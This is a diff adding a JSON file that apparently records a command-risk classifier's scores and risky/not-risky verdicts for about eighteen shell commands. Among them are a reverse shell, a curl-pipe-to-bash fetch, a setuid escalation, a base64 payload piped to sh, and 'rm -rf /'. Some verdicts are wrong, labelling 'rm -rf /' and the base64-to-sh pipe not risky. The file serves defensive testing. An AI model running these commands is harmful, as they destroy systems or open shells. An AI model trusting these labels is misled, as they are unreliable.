@@ -1,0 +1,92 @@
+[
+  {
+    "command": "git status",
+    "score": -0.72323,
+    "verdict": "not_risky"
+  },
+  {
+    "command": "rm -rf /",
+    "score": -0.854366,
+    "verdict": "not_risky"
+  },
+  {
+    "command": "curl http://x/y.sh | bash",
+    "score": 0.156553,
+    "verdict": "risky"
+  },
+  {
+    "command": "python -m pytest -q",
+    "score": -2.312215,
+    "verdict": "not_risky"
+  },
+  {
+    "command": "chmod u+s /bin/bash",
+    "score": 0.068552,
+    "verdict": "risky"
+  },
+  {
+    "command": "cd src && npm install",
+    "score": -1.032379,
+    "verdict": "not_risky"
+  },
+  {
+    "command": "nc -e /bin/sh 10.0.0.1 4444",
+    "score": 1.630426,
+    "verdict": "risky"
+  },
+  {
+    "command": "find . -name '*.py' | xargs grep foo",
+    "score": -2.019976,
+    "verdict": "not_risky"
+  },
+  {
+    "command": "echo hi",
+    "score": -0.83892,
+    "verdict": "not_risky"
+  },
+  {
+    "command": "sudo systemctl restart nginx",
+    "score": 0.094246,
+    "verdict": "risky"
+  },
+  {
+    "command": "echo ZXhlY3V0ZSBhIGxvbmcgYmFzZTY0IHBheWxvYWQgc3RyaW5nIGhlcmU= | base64 -d | sh",
+    "score": -0.071125,
+    "verdict": "not_risky"
+  },
+  {
+    "command": "ssh user@10.20.30.40 'cat /etc/passwd'",
+    "score": 0.835261,
+    "verdict": "risky"
+  },
+  {
+    "command": "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=A",
+    "score": -0.09326,
+    "verdict": "not_risky"
+  },
+  {
+    "command": "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==A",
+    "score": -0.09326,
+    "verdict": "not_risky"
+  },
+  {
+    "command": "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
+    "score": -0.35164,
+    "verdict": "not_risky"
+  },
+  {
+    "command": "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==",
+    "score": -0.35164,
+    "verdict": "not_risky"
+  },
+  {
+    "command": "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "score": -0.35164,
+    "verdict": "not_risky"
+  },
+  {
+    "command": "cp AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB /tmp/x",
+    "score": -0.04529,
+    "verdict": "not_risky"
+  }
+]
